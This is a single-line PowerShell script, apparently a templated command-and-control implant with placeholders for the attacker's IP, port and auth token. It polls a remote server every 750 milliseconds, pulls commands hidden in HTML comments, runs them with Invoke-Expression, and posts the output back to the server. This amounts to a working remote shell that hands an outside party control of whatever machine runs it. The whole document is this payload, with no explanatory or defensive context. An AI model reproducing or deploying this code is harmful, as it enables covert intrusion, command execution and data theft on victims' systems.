$port="%port%";$ip="%ip%";$auth="%auth%";$pool=(Invoke-RestMethod -Uri "http://${ip}:${port}/e030d4f6" -Headers @{"Authorization"=$auth}).ToString();while($true){Start-Sleep -Milliseconds 750;$c=(Invoke-RestMethod -Uri "http://${ip}:${port}/${pool}" -Headers @{"Authorization"=$auth}).ToString();$b=[regex]::Match($c, '<!--(.*?)-->').Groups[1].Value.TrimStart('!');if($b.StartsWith('*')){$pool=$b.TrimStart('*')}else{$asodifj=iex $b -ErrorAction Stop -ErrorVariable e;$asodifj=Out-String -InputObject $asodifj;Invoke-RestMethod -Uri "http://${ip}:${port}/${pool}" -Method Post -Headers @{"Authorization"=$auth} -Body ([System.Text.Encoding]::UTF8.GetBytes($asodifj) -join ' ')}}